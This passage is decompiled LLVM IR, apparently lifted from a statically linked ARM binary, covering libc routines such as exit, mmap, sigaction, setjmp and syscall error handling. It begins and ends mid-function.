  store i32 %v2_14994.pre, i32* %r0.global-to-local, align 4
  %v2_14998 = add i32 %v2_14994.pre, -67204
  store i32 %v2_14998, i32* %r2.global-to-local, align 4
  store i32 %v2_14998, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_149a0 = icmp eq i32 %v2_14998, 0
  store i1 %v2_149a0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_149a0, label %dec_label_pc_149b8, label %dec_label_pc_149a8

dec_label_pc_149a8:                               ; preds = %dec_label_pc_14990
  store i32 84400, i32* @lr, align 4
  call void @__pseudo_branch(i32 %v2_14998)
  store i32 0, i32* %r3.global-to-local, align 4
  %v1_149b4 = load i32, i32* %r0.global-to-local, align 4
  %v2_149b4 = inttoptr i32 %v1_149b4 to i32*
  store i32 0, i32* %v2_149b4, align 4
  %v2_149bc.pre = load i32, i32* %stack_var_-416, align 4
  br label %dec_label_pc_149b8

dec_label_pc_149b8:                               ; preds = %dec_label_pc_14990, %dec_label_pc_149a8
  %v2_149bc = phi i32 [ %v2_14994.pre, %dec_label_pc_14990 ], [ %v2_149bc.pre, %dec_label_pc_149a8 ]
  store i32 128, i32* %r3.global-to-local, align 4
  store i32 %v2_149bc, i32* %r1.global-to-local, align 4
  %v2_149c0 = add i32 %v2_149bc, 128
  %v3_149c0 = inttoptr i32 %v2_149c0 to i32*
  %v4_149c0 = load i32, i32* %v3_149c0, align 4
  store i32 %v4_149c0, i32* %r2.global-to-local, align 4
  store i32 %v4_149c0, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_149c8 = icmp eq i32 %v4_149c0, 0
  store i1 %v2_149c8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_149c8, label %dec_label_pc_149e0, label %dec_label_pc_149d0

dec_label_pc_149d0:                               ; preds = %dec_label_pc_149b8
  store i32 84440, i32* @lr, align 4
  call void @__pseudo_branch(i32 %v4_149c0)
  store i32 0, i32* %r3.global-to-local, align 4
  %v1_149dc = load i32, i32* %r0.global-to-local, align 4
  %v2_149dc = inttoptr i32 %v1_149dc to i32*
  store i32 0, i32* %v2_149dc, align 4
  br label %dec_label_pc_149e0

dec_label_pc_149e0:                               ; preds = %dec_label_pc_149b8, %dec_label_pc_149d0
  %v2_149e0 = ptrtoint i32* %stack_var_-400 to i32
  store i32 %v2_149e0, i32* @r0, align 4
  %v1_149e4 = call i32 @_setjmp(i32 %v2_149e0)
  store i32 %v1_149e4, i32* %r0.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_149e8 = icmp eq i32 %v1_149e4, 0
  store i1 %v2_149e8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_149e8, label %dec_label_pc_149f0, label %dec_label_pc_14a3c

dec_label_pc_149f0:                               ; preds = %dec_label_pc_149e0
  %v0_149f0 = call i32 @__aeabi_read_tp()
  store i32 %v0_149f0, i32* %r0.global-to-local, align 4
  %v1_149f4 = add i32 %v0_149f0, -1168
  store i32 %v1_149f4, i32* %r2.global-to-local, align 4
  %v2_149fc = load i32, i32* %stack_var_-416, align 4
  store i32 %v2_149fc, i32* %r4.global-to-local, align 4
  store i32 56, i32* %r3.global-to-local, align 4
  %v2_14a08 = add i32 %v2_149fc, 56
  %v3_14a08 = inttoptr i32 %v2_14a08 to i32*
  %v4_14a08 = load i32, i32* %v3_14a08, align 4
  store i32 %v4_14a08, i32* %ip.global-to-local, align 4
  store i32 %v2_149e0, i32* %r3.global-to-local, align 4
  %v2_14a18 = add i32 %v0_149f0, -1040
  %v3_14a18 = inttoptr i32 %v2_14a18 to i32*
  store i32 %v2_149e0, i32* %v3_14a18, align 4
  store i32 %tmp, i32* %r1.global-to-local, align 4
  store i32 %arg2, i32* %r0.global-to-local, align 4
  %v0_14a24 = load i32, i32* %ip.global-to-local, align 4
  %v1_14a24 = inttoptr i32 %v0_14a24 to i32*
  %v2_14a24 = load i32, i32* %v1_14a24, align 4
  store i32 %v2_14a24, i32* %r2.global-to-local, align 4
  store i32 %arg1, i32* %r5.global-to-local, align 4
  call void @__pseudo_branch(i32 %arg1)
  %v0_14a34 = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_14ad8

dec_label_pc_14a3c:                               ; preds = %dec_label_pc_149e0
  store i32 40, i32* %r3.global-to-local, align 4
  %v2_14a40 = load i32, i32* %stack_var_-416, align 4
  store i32 %v2_14a40, i32* %ip.global-to-local, align 4
  %v2_14a44 = add i32 %v2_14a40, 40
  %v3_14a44 = inttoptr i32 %v2_14a44 to i32*
  %v4_14a44 = load i32, i32* %v3_14a44, align 4
  store i32 %v4_14a44, i32* %ip.global-to-local, align 4
  call void @__pseudo_branch(i32 %v4_14a44)
  store i32 120, i32* %r3.global-to-local, align 4
  %v2_14a54 = load i32, i32* %stack_var_-416, align 4
  %v2_14a58 = add i32 %v2_14a54, 120
  %v3_14a58 = inttoptr i32 %v2_14a58 to i32*
  %v4_14a58 = load i32, i32* %v3_14a58, align 4
  store i32 %v4_14a58, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_14a5c

dec_label_pc_14a5c:                               ; preds = %dec_label_pc_14a90.dec_label_pc_14a5c_crit_edge, %dec_label_pc_14a3c
  %v0_14a5c = phi i32 [ %v0_14a5c.pre, %dec_label_pc_14a90.dec_label_pc_14a5c_crit_edge ], [ %v4_14a58, %dec_label_pc_14a3c ]
  %v1_14a5c = inttoptr i32 %v0_14a5c to i32*
  %v2_14a5c = load i32, i32* %v1_14a5c, align 4
  store i32 %v0_14a5c, i32* %r2.global-to-local, align 4
  store i32 %v2_14a5c, i32* %r4.global-to-local, align 4
  %v1_14a68 = add i32 %v2_14a5c, -1
  store i32 %v1_14a68, i32* %r1.global-to-local, align 4
  %v2_14a6c89 = load i32, i32* %v1_14a5c, align 4
  store i32 %v2_14a6c89, i32* %r3.global-to-local, align 4
  %v3_14a7091 = icmp uge i32 %v2_14a6c89, %v2_14a5c
  store i1 %v3_14a7091, i1* %cpsr_c.global-to-local, align 1
  %v9_14a7097 = icmp eq i32 %v2_14a6c89, %v2_14a5c
  store i1 %v9_14a7097, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_14a7097, label %dec_label_pc_14a78, label %dec_label_pc_14a90

dec_label_pc_14a78:                               ; preds = %dec_label_pc_14a5c, %dec_label_pc_14a78.dec_label_pc_14a6c_crit_edge
  %v0_14a7898 = phi i32 [ %v1_14a70.pre, %dec_label_pc_14a78.dec_label_pc_14a6c_crit_edge ], [ %v2_14a5c, %dec_label_pc_14a5c ]
  store i32 %v0_14a7898, i32* %r0.global-to-local, align 4
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_14a88 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_14a88, label %dec_label_pc_14a8c, label %dec_label_pc_14a78.dec_label_pc_14a6c_crit_edge

dec_label_pc_14a78.dec_label_pc_14a6c_crit_edge:  ; preds = %dec_label_pc_14a78
  %v0_14a6c.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_14a70.pre = load i32, i32* %r4.global-to-local, align 4
  %v1_14a6c = inttoptr i32 %v0_14a6c.pre to i32*
  %v2_14a6c = load i32, i32* %v1_14a6c, align 4
  store i32 %v2_14a6c, i32* %r3.global-to-local, align 4
  %v3_14a70 = icmp uge i32 %v2_14a6c, %v1_14a70.pre
  store i1 %v3_14a70, i1* %cpsr_c.global-to-local, align 1
  %v9_14a70 = icmp eq i32 %v2_14a6c, %v1_14a70.pre
  store i1 %v9_14a70, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_14a70, label %dec_label_pc_14a78, label %dec_label_pc_14a90

dec_label_pc_14a8c:                               ; preds = %dec_label_pc_14a78
  %v0_14a8c = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_14a8c, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_14a90

dec_label_pc_14a90:                               ; preds = %dec_label_pc_14a5c, %dec_label_pc_14a78.dec_label_pc_14a6c_crit_edge, %dec_label_pc_14a8c
  %v0_14a98 = phi i32 [ %v0_14a8c, %dec_label_pc_14a8c ], [ %v2_14a6c89, %dec_label_pc_14a5c ], [ %v2_14a6c, %dec_label_pc_14a78.dec_label_pc_14a6c_crit_edge ]
  %v1_14a90 = phi i32 [ %v0_14a8c, %dec_label_pc_14a8c ], [ %v2_14a5c, %dec_label_pc_14a5c ], [ %v1_14a70.pre, %dec_label_pc_14a78.dec_label_pc_14a6c_crit_edge ]
  %v3_14a90 = icmp uge i32 %v0_14a98, %v1_14a90
  store i1 %v3_14a90, i1* %cpsr_c.global-to-local, align 1
  %v9_14a90 = icmp eq i32 %v0_14a98, %v1_14a90
  store i1 %v9_14a90, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_14a90, label %dec_label_pc_14a98, label %dec_label_pc_14a90.dec_label_pc_14a5c_crit_edge

dec_label_pc_14a90.dec_label_pc_14a5c_crit_edge:  ; preds = %dec_label_pc_14a90
  %v0_14a5c.pre = load i32, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_14a5c

dec_label_pc_14a98:                               ; preds = %dec_label_pc_14a90
  %v2_14a98 = icmp ne i32 %v1_14a90, 0
  store i1 %v2_14a98, i1* %cpsr_c.global-to-local, align 1
  %v7_14a98 = icmp eq i32 %v1_14a90, 1
  store i1 %v7_14a98, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_14a98, label %dec_label_pc_14ad8, label %dec_label_pc_14aa0

dec_label_pc_14aa0:                               ; preds = %dec_label_pc_14a98
  store i32 0, i32* %r0.global-to-local, align 4
  store i32 1, i32* %r7.global-to-local, align 4
  store i1 false, i1* %cpsr_c.global-to-local, align 1
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_14ad8

dec_label_pc_14ad8:                               ; preds = %dec_label_pc_14a98, %dec_label_pc_14aa0, %dec_label_pc_149f0
  %storemerge2 = phi i32 [ %v0_14a34, %dec_label_pc_149f0 ], [ 0, %dec_label_pc_14aa0 ], [ 0, %dec_label_pc_14a98 ]
  store i32 %storemerge2, i32* %r1.global-to-local, align 4
  store i32 %storemerge2, i32* %r0.global-to-local, align 4
  %v1_14adc = call i32 @__GI_exit(i32 %storemerge2)
  store i32 %v1_14adc, i32* %r0.global-to-local, align 4
  %v0_14ae0 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_14ae0, label %bb85, label %.thread9

bb85:                                             ; preds = %dec_label_pc_14ad8
  %v2_14ae4 = load i32, i32* @r8, align 4
  %v8_14ae4 = shl i32 %v2_14ae4, %v1_14adc
  %v9_14ae4 = and i32 %v8_14ae4, %v1_14adc
  %v8_14ae8 = lshr i32 %v2_14ae4, %v9_14ae4
  %v9_14ae8 = and i32 %v8_14ae8, %v9_14ae4
  %v2_14aec = inttoptr i32 %v9_14ae8 to i64*
  %v3_14aec = load i64, i64* %v2_14aec, align 4
  %v5_14aec = trunc i64 %v3_14aec to i32
  %v6_14aec = udiv i64 %v3_14aec, 4294967296
  %v7_14aec = trunc i64 %v6_14aec to i32
  store i32 %v5_14aec, i32* %r1.global-to-local, align 4
  %v9_14aec = sub i32 %v7_14aec, %v2_14ae4
  %v1_14af0 = load i32, i32* %r4.global-to-local, align 4
  %v3_14af0 = mul i32 %v9_14aec, %v1_14af0
  %v5_14af8 = mul i32 %v1_14af0, 4
  %v5_14afc = udiv i32 %v1_14af0, 2
  %v6_14af8 = and i32 %v5_14afc, %v5_14af8
  %v6_14afc = and i32 %v6_14af8, %v3_14af0
  store i1 false, i1* %cpsr_c.global-to-local, align 1
  store i32 %v6_14afc, i32* %r0.global-to-local, align 4
  br label %.thread9

.thread9:                                         ; preds = %dec_label_pc_14ad8, %bb85
  %v5_14b00 = phi i32 [ %v1_14adc, %dec_label_pc_14ad8 ], [ %v6_14afc, %bb85 ]
  ret i32 %v5_14b00

; uselistorder directives
  uselistorder i32 %v1_14af0, { 1, 0, 2 }
  uselistorder i32 %v1_14adc, { 1, 0, 2, 3 }
  uselistorder i32 %storemerge2, { 1, 0, 2 }
  uselistorder i32 %v1_14a90, { 1, 0, 2, 3 }
  uselistorder i32 %v0_14a8c, { 1, 0, 2 }
  uselistorder i32 %v1_14a70.pre, { 0, 3, 2, 1 }
  uselistorder i32 %v0_14a5c, { 1, 0 }
  uselistorder i32 %v2_149bc, { 1, 0 }
  uselistorder i32 %v2_14994.pre, { 2, 0, 1 }
  uselistorder i32 %v1_14988, { 1, 0 }
  uselistorder i32 %v1_14984, { 3, 2, 1, 0 }
  uselistorder i32 %v1_14978, { 1, 0 }
  uselistorder i32 %v1_14944, { 1, 0 }
  uselistorder i32 %v1_14940, { 1, 2, 3, 0 }
  uselistorder i32 %v1_14934, { 1, 0 }
  uselistorder i32 %v2_14910, { 1, 0, 2 }
  uselistorder i32 %v4_148f4, { 1, 0, 2 }
  uselistorder i32 %v4_148e4, { 1, 0, 2, 3 }
  uselistorder i1 %v8_1482c, { 1, 2, 0 }
  uselistorder i32 %v2_147f8, { 1, 2, 0 }
  uselistorder i32 %v1_147f4, { 1, 2, 0 }
  uselistorder i1 %v2_147e0, { 1, 0, 2 }
  uselistorder i32 %v5_147e4, { 1, 0, 2, 3 }
  uselistorder i32 %v2_147b0, { 1, 0, 2, 3 }
  uselistorder i32 %v0_14798, { 1, 0, 2 }
  uselistorder i32 %v2_1478c, { 1, 0, 2 }
  uselistorder i32 %v3_1475c, { 1, 0 }
  uselistorder i32* %stack_var_-416, { 2, 3, 4, 0, 1, 5, 6, 7, 8, 9, 10, 11 }
  uselistorder i32 %tmp65, { 1, 2, 5, 0, 3, 4 }
  uselistorder i32 %tmp64, { 2, 1, 0 }
  uselistorder i32 %tmp63, { 2, 1, 0 }
  uselistorder i32 %tmp62, { 2, 1, 0 }
  uselistorder i32* %r7.global-to-local, { 0, 1, 2, 4, 3, 5 }
  uselistorder i32* %r4.global-to-local, { 3, 1, 0, 2, 4, 5, 7, 6, 8, 9, 10, 11, 12, 13, 14, 15 }
  uselistorder i32* %r3.global-to-local, { 4, 6, 5, 2, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 3, 26, 27, 28, 0, 1 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 0 }
  uselistorder i32* %r1.global-to-local, { 5, 4, 6, 7, 8, 9, 10, 11, 13, 12, 14, 15, 16, 1, 2, 3, 17, 18, 19, 0 }
  uselistorder i32* %r0.global-to-local, { 1, 3, 2, 4, 5, 6, 7, 8, 12, 9, 10, 11, 17, 13, 14, 15, 16, 19, 18, 20, 21, 22, 25, 23, 24, 27, 26, 0 }
  uselistorder i32* %ip.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 8, 7, 9, 10 }
  uselistorder i1* %cpsr_z.global-to-local, { 8, 4, 5, 6, 7, 0, 9, 10, 11, 12, 1, 13, 14, 2, 15, 16, 17, 18, 19, 20, 21, 22, 23, 25, 24, 3, 26 }
  uselistorder i1* %cpsr_c.global-to-local, { 4, 5, 6, 7, 9, 8, 0, 10, 11, 12, 14, 13, 2, 15, 17, 16, 1, 18, 19, 20, 21, 22, 23, 24, 25, 26, 29, 27, 28, 3, 30 }
  uselistorder i32 (i32)* @__GI_exit, { 0, 6, 7, 5, 4, 3, 2, 1 }
  uselistorder i32 (i32, i32)* @__check_one_fd, { 2, 1, 0 }
  uselistorder i32 536870912, { 1, 0 }
  uselistorder i32 120, { 0, 2, 1, 5, 4, 3 }
  uselistorder i32 2008, { 1, 0, 2, 3 }
  uselistorder i32 %arg6, { 1, 0, 2 }
  uselistorder i32 %arg5, { 1, 0 }
  uselistorder i32 %arg2, { 1, 0, 2 }
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %.thread9, { 1, 0 }
  uselistorder label %dec_label_pc_14ad8, { 1, 0, 2 }
  uselistorder label %dec_label_pc_14a90, { 2, 1, 0 }
  uselistorder label %dec_label_pc_14a78, { 1, 0 }
  uselistorder label %dec_label_pc_149e0, { 1, 0 }
  uselistorder label %dec_label_pc_149b8, { 1, 0 }
  uselistorder label %dec_label_pc_14934, { 1, 0 }
  uselistorder label %bb84, { 1, 0, 2 }
  uselistorder label %dec_label_pc_148b0, { 2, 0, 1 }
  uselistorder label %dec_label_pc_14888, { 3, 0, 1, 2 }
  uselistorder label %bb82, { 1, 0 }
  uselistorder label %dec_label_pc_147f8, { 1, 0 }
  uselistorder label %bb79, { 1, 0 }
  uselistorder label %dec_label_pc_147e0, { 1, 0 }
  uselistorder label %bb77, { 1, 0 }
  uselistorder label %bb75, { 1, 0 }
}

define i32 @mmap(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_14b2c = load i32, i32* @r4, align 4
  store i32 %v3_14b2c, i32* %stack_var_-16, align 4
  %v3_14b38 = urem i32 %arg3, 4096
  %v2_14b3c = icmp eq i32 %v3_14b38, 0
  br i1 %v2_14b3c, label %dec_label_pc_14b60, label %dec_label_pc_14b44

dec_label_pc_14b44:                               ; preds = %entry
  %v0_14b48 = call i32 @__aeabi_read_tp()
  store i32 %v0_14b48, i32* %r0.global-to-local, align 4
  %v3_14b4c = load i16, i16* @global_var_21a38.351, align 2
  %v4_14b4c = sext i16 %v3_14b4c to i32
  store i32 -1, i32* %r1.global-to-local, align 4
  %v3_14b58 = add i32 %v4_14b4c, %v0_14b48
  %v4_14b58 = inttoptr i32 %v3_14b58 to i32*
  store i32 22, i32* %v4_14b58, align 4
  %v0_14b94.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_14b94

dec_label_pc_14b60:                               ; preds = %entry
  %v0_14b70 = load i32, i32* %r0.global-to-local, align 4
  %tmp = icmp ult i32 %v0_14b70, -4095
  br i1 %tmp, label %dec_label_pc_14b90, label %dec_label_pc_14b78

dec_label_pc_14b78:                               ; preds = %dec_label_pc_14b60
  %v1_14b7c = sub i32 0, %v0_14b70
  %v3_14b80 = load i16, i16* @global_var_21a38.351, align 2
  %v4_14b80 = sext i16 %v3_14b80 to i32
  %v0_14b84 = call i32 @__aeabi_read_tp()
  %v3_14b88 = add i32 %v4_14b80, %v0_14b84
  %v4_14b88 = inttoptr i32 %v3_14b88 to i32*
  store i32 %v1_14b7c, i32* %v4_14b88, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_14b90

dec_label_pc_14b90:                               ; preds = %dec_label_pc_14b60, %dec_label_pc_14b78
  %v0_14b90 = phi i32 [ %v0_14b70, %dec_label_pc_14b60 ], [ -1, %dec_label_pc_14b78 ]
  store i32 %v0_14b90, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_14b94

dec_label_pc_14b94:                               ; preds = %dec_label_pc_14b44, %dec_label_pc_14b90
  %v0_14b94 = phi i32 [ %v0_14b94.pre, %dec_label_pc_14b44 ], [ %v0_14b90, %dec_label_pc_14b90 ]
  store i32 %v0_14b94, i32* %r0.global-to-local, align 4
  %v2_14b98 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_14b98, i32* @r4, align 4
  ret i32 %v0_14b94

; uselistorder directives
  uselistorder i32 %v0_14b94, { 1, 0 }
  uselistorder i32 %v0_14b70, { 1, 2, 0 }
  uselistorder i32* %r0.global-to-local, { 2, 3, 0, 4, 1 }
  uselistorder label %dec_label_pc_14b94, { 1, 0 }
  uselistorder label %dec_label_pc_14b90, { 1, 0 }
}

define i32 @__syscall_error() local_unnamed_addr {
entry:
  %stack_var_-4 = alloca i32, align 4
  %v0_14ba8 = load i32, i32* @lr, align 4
  store i32 %v0_14ba8, i32* %stack_var_-4, align 4
  %v0_14bb0 = load i32, i32* @r0, align 4
  %v3_14bb4 = load i16, i16* @global_var_21a38.351, align 2
  %v4_14bb4 = sext i16 %v3_14bb4 to i32
  store i32 %v4_14bb4, i32* @r2, align 4
  %v0_14bb8 = call i32 @__aeabi_read_tp()
  %v1_14bbc = sub i32 0, %v0_14bb0
  store i32 %v1_14bbc, i32* @r3, align 4
  %v2_14bc0 = load i32, i32* @r2, align 4
  %v3_14bc0 = add i32 %v2_14bc0, %v0_14bb8
  %v4_14bc0 = inttoptr i32 %v3_14bc0 to i32*
  store i32 %v1_14bbc, i32* %v4_14bc0, align 4
  %v2_14bc8 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_14bc8, i32* @lr, align 4
  ret i32 -1
}

define i32 @__libc_sigaction(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r6.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* @r1, align 4
  %stack_var_-36 = alloca i32, align 4
  %v3_14bd4 = load i32, i32* @r4, align 4
  %v6_14bd4 = load i32, i32* @r5, align 4
  store i32 %arg2, i32* @ip, align 4
  %v2_14bdc = icmp eq i32 %arg2, 0
  store i32 ptrtoint (i32* @global_var_219e0.355 to i32), i32* @r4, align 4
  store i32 %arg1, i32* @r5, align 4
  store i32 %arg3, i32* %r6.global-to-local, align 4
  br i1 %v2_14bdc, label %dec_label_pc_14c30, label %dec_label_pc_14bf4

dec_label_pc_14bf4:                               ; preds = %entry
  %v1_14bf4 = add i32 %arg2, 4
  %v2_14bf4 = inttoptr i32 %v1_14bf4 to i32*
  %v3_14bf4 = load i32, i32* %v2_14bf4, align 4
  store i32 %v3_14bf4, i32* @r3, align 4
  %v1_14bf8 = and i32 %v3_14bf4, 67108864
  %v2_14bf8 = icmp eq i32 %v1_14bf8, 0
  br i1 %v2_14bf8, label %dec_label_pc_14c00, label %dec_label_pc_14c30

dec_label_pc_14c00:                               ; preds = %dec_label_pc_14bf4
  store i32 20, i32* @r2, align 4
  %v2_14c04 = ptrtoint i32* %stack_var_-36 to i32
  store i32 %v2_14c04, i32* @r0, align 4
  %v0_14c08 = call i32 @memcpy()
  %v0_14c30.pre = load i32, i32* @r5, align 4
  %v0_14c38.pre = load i32, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_14c30

dec_label_pc_14c30:                               ; preds = %dec_label_pc_14bf4, %entry, %dec_label_pc_14c00
  %v0_14c38 = phi i32 [ %arg3, %dec_label_pc_14bf4 ], [ %arg3, %entry ], [ %v0_14c38.pre, %dec_label_pc_14c00 ]
  %v0_14c34 = phi i32 [ %arg2, %dec_label_pc_14bf4 ], [ 0, %entry ], [ %v2_14c04, %dec_label_pc_14c00 ]
  %v0_14c30 = phi i32 [ %arg1, %dec_label_pc_14bf4 ], [ %arg1, %entry ], [ %v0_14c30.pre, %dec_label_pc_14c00 ]
  %v4_14c40 = call i32 @__syscall_rt_sigaction(i32 %v0_14c30, i32 %v0_14c34, i32 %v0_14c38, i32 8)
  store i32 %v3_14bd4, i32* @r4, align 4
  store i32 %v6_14bd4, i32* @r5, align 4
  ret i32 %v4_14c40

; uselistorder directives
  uselistorder label %dec_label_pc_14c30, { 2, 0, 1 }
}

define i32 @function_14c54(i32 %arg1) local_unnamed_addr {
dec_label_pc_14c54:
  %v0_14c54 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_14c54, label %bb, label %.thread

bb:                                               ; preds = %dec_label_pc_14c54
  %v2_14c54 = load i32, i32* @r8, align 4
  %v4_14c54 = mul i32 %v2_14c54, 2
  %v5_14c54 = and i32 %v4_14c54, %arg1
  %v2_14c58 = load i32, i32* @ip, align 4
  %v4_14c58 = lshr i32 %v2_14c58, %v5_14c54
  %v5_14c58 = sub i32 32, %v5_14c54
  %v6_14c58 = shl i32 %v2_14c58, %v5_14c58
  %v7_14c58 = or i32 %v6_14c58, %v4_14c58
  %v9_14c58 = and i32 %v7_14c58, %v5_14c54
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_14c54, %bb
  %v10_14c58 = phi i32 [ %arg1, %dec_label_pc_14c54 ], [ %v9_14c58, %bb ]
  ret i32 %v10_14c58

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %.thread, { 1, 0 }
}

define i32 @_setjmp(i32 %arg1) local_unnamed_addr {
entry:
  store i32 0, i32* @r1, align 4
  %v0_14c60 = call i32 @__sigsetjmp()
  ret i32 %v0_14c60
}

define i32 @__default_sa_restorer(i32 %arg1) local_unnamed_addr {
entry:
  ret i32 %arg1
}

define i32 @__default_rt_sa_restorer(i32 %arg1) local_unnamed_addr {
entry:
  ret i32 %arg1
}

define i32 @__aeabi_read_tp() local_unnamed_addr {
entry:
  call void @__pseudo_branch(i32 -61472)
  ret i32 -61441
}

define i32 @__syscall_rt_sigaction(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_14c90 = load i32, i32* @r7, align 4
  store i32 %v3_14c90, i32* %stack_var_-8, align 4
  %v0_14c9c = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_14c9c, i32* %r2.global-to-local, align 4
  %tmp = icmp ult i32 %v0_14c9c, -4095
  br i1 %tmp, label %dec_label_pc_14cc4, label %dec_label_pc_14cac

dec_label_pc_14cac:                               ; preds = %entry
  %v0_14cb0 = call i32 @__aeabi_read_tp()
  %v3_14cb4 = load i16, i16* @global_var_21a38.351, align 2
  %v4_14cb4 = sext i16 %v3_14cb4 to i32
  %v0_14cb8 = load i32, i32* %r2.global-to-local, align 4
  %v1_14cb8 = sub i32 0, %v0_14cb8
  store i32 %v1_14cb8, i32* %r2.global-to-local, align 4
  %v3_14cbc = add i32 %v4_14cb4, %v0_14cb0
  %v4_14cbc = inttoptr i32 %v3_14cbc to i32*
  store i32 %v1_14cb8, i32* %v4_14cbc, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  %v2_14cc4.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_14cc4

dec_label_pc_14cc4:                               ; preds = %entry, %dec_label_pc_14cac
  %v1_14cc8 = phi i32 [ %v0_14c9c, %entry ], [ -1, %dec_label_pc_14cac ]
  %v2_14cc4 = phi i32 [ %v3_14c90, %entry ], [ %v2_14cc4.pre, %dec_label_pc_14cac ]
  store i32 %v2_14cc4, i32* @r7, align 4
  ret i32 %v1_14cc8

; uselistorder directives
  uselistorder i32 %v0_14c9c, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 2, 0, 1 }
  uselistorder label %dec_label_pc_14cc4, { 1, 0 }
}

define i32 @__GI__exit(i32 %arg1) local_unnamed_addr {
entry:
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_14cdc

dec_label_pc_14cdc:                               ; preds = %dec_label_pc_14d08, %dec_label_pc_14d1c, %entry
  %v0_14cdc = phi i32 [ %arg1, %entry ], [ %v0_14cdc.pre.pre, %dec_label_pc_14d1c ], [ %v0_14d08, %dec_label_pc_14d08 ]
  store i32 %v0_14cdc, i32* %r2.global-to-local, align 4
  %tmp = icmp ult i32 %v0_14cdc, -4095
  br i1 %tmp, label %dec_label_pc_14d08, label %dec_label_pc_14cf8

dec_label_pc_14cf8:                               ; preds = %dec_label_pc_14cdc
  %v0_14cf8 = call i32 @__aeabi_read_tp()
  %v0_14cfc = load i32, i32* %r2.global-to-local, align 4
  %v1_14cfc = sub i32 0, %v0_14cfc
  store i32 %v1_14cfc, i32* %r2.global-to-local, align 4
  %v3_14d00 = load i16, i16* @global_var_21a38.351, align 2
  %v4_14d00 = sext i16 %v3_14d00 to i32
  %v3_14d04 = add i32 %v4_14d00, %v0_14cf8
  %v4_14d04 = inttoptr i32 %v3_14d04 to i32*
  store i32 %v1_14cfc, i32* %v4_14d04, align 4
  %v0_14d08.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_14d08

dec_label_pc_14d08:                               ; preds = %dec_label_pc_14cdc, %dec_label_pc_14cf8
  %v0_14d08 = phi i32 [ %v0_14cdc, %dec_label_pc_14cdc ], [ %v0_14d08.pre, %dec_label_pc_14cf8 ]
  store i32 %v0_14d08, i32* %r2.global-to-local, align 4
  %tmp4 = icmp ult i32 %v0_14d08, -4095
  br i1 %tmp4, label %dec_label_pc_14cdc, label %dec_label_pc_14d1c

dec_label_pc_14d1c:                               ; preds = %dec_label_pc_14d08
  %v0_14d1c = call i32 @__aeabi_read_tp()
  %v0_14d20 = load i32, i32* %r2.global-to-local, align 4
  %v1_14d20 = sub i32 0, %v0_14d20
  store i32 %v1_14d20, i32* %r2.global-to-local, align 4
  %v3_14d24 = load i16, i16* @global_var_21a38.351, align 2
  %v4_14d24 = sext i16 %v3_14d24 to i32
  %v3_14d28 = add i32 %v4_14d24, %v0_14d1c
  %v4_14d28 = inttoptr i32 %v3_14d28 to i32*
  store i32 %v1_14d20, i32* %v4_14d28, align 4
  %v0_14cdc.pre.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_14cdc

; uselistorder directives
  uselistorder i32 %v0_14d08, { 0, 2, 1 }
  uselistorder i32 %v0_14cdc, { 1, 0, 2 }
  uselistorder label %dec_label_pc_14d08, { 1, 0 }
  uselistorder label %dec_label_pc_14cdc, { 1, 0, 2 }
}

define i32 @fstat() local_unnamed_addr {
entry:
  %r7.global-to-local = alloca i32, align 4
